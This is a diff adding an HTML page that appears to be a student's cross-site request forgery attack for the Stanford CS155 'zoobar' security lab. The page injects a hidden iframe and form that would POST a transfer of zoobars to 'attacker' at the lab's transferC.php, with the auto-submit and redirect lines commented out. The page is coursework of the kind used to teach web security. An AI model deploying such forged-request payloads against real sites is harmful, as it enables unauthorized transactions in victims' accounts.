@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		<title>&nbsp;</title>
+		<meta charset="UTF-8"/>
+		<style>
+			/*#outerFrame{display: none;}*/
+		</style>
+	</head>
+
+	<body>
+
+		<iframe id='outerFrame' name='outerFrame' style='width: 100%; height: 2000px; margin: 0px; padding: 0px; background-color: #DDDDFF;'></iframe>
+		
+		
+		<script type="text/javascript">
+		//<![CDATA[
+			var egg = "<iframe id='innerFrame' name='innerFrame' style='width:100%; height: 2000px; margin: 0px; padding: 0px; opacity: 0.5;'></iframe>" +
+				"<form id='transferForm' action='http://zoobar.stanford.edu/transferC.php' method='POST' target='innerFrame'>" +
+				"<input type='text' name='zoobars' value='10'>" +
+				"<input type='text' name='recipient' value='attacker'>" +
+				"<input type='text' name='submission' value='Send'>" +
+				"</form>";
+
+			// TODO: need to change localhost to zoobar.stanford.edu
+
+			var outerFrameDoc = document.getElementById("outerFrame").contentDocument;
+			
+			// Hack, trigger a page load, otherwise attack works in Chrome but not in Firefox. 
+			// See http://stackoverflow.com/questions/7828502/cannot-set-document-body-innerhtml-of-iframe-in-firefox
+			outerFrameDoc.open();
+			outerFrameDoc.close();
+			//Set innerHTML of the body tag.
+			outerFrameDoc.body.innerHTML = egg;
+			
+			var transferForm = outerFrameDoc.body.children['transferForm'];
+			//transferForm.submit();
+			
+			//setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, 50 );
+		//]]>
+		</script>
+		
+	</body>
+
+</html>
